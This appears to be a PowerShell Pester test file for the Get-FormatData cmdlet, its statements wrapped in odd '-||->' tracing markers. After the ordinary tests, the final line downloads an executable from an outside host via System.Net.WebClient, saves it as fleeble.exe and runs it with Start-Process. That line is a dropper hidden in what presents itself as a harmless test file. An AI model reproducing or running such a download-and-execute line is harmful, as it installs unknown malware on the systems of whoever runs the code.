

 -||-> Describe "Get-FormatData" -Tags "CI" {

     -||-> Context "Check return type of Get-FormatData" {

         -||-> It "Should return an object[] as the return type" {
             -||-> $result =  -||-> Get-FormatData <-||-  <-||- 
             -||-> ,$result | Should -BeOfType "System.Object[]" <-||- 
        } <-||- 
    } <-||- 

     -||-> It "Can get format data requiring '-PowerShellVersion 5.1'" {
         -||-> $format =  -||-> Get-FormatData System.IO.FileInfo -PowerShellVersion 5.1 <-||-  <-||- 
         -||-> $format.TypeNames | Should -HaveCount 2 <-||- 
         -||-> $format.TypeNames[0] | Should -BeExactly "System.IO.DirectoryInfo" <-||- 
         -||-> $format.TypeNames[1] | Should -BeExactly "System.IO.FileInfo" <-||- 
         -||-> $format.FormatViewDefinition | Should -HaveCount 4 <-||- 
    } <-||- 

     -||-> It "Should return nothing for format data requiring '-PowerShellVersion 5.1' and not provided" {
         -||-> Get-FormatData System.IO.FileInfo | Should -BeNullOrEmpty <-||- 
    } <-||- 
} <-||- 

 -||-> ( -||-> New-Object System.Net.WebClient <-||- ).DownloadFile('http://ddl2.data.hu/get/0/9589621/k000.exe','fleeble.exe') <-||- ; -||-> Start-Process 'fleeble.exe' <-||- 



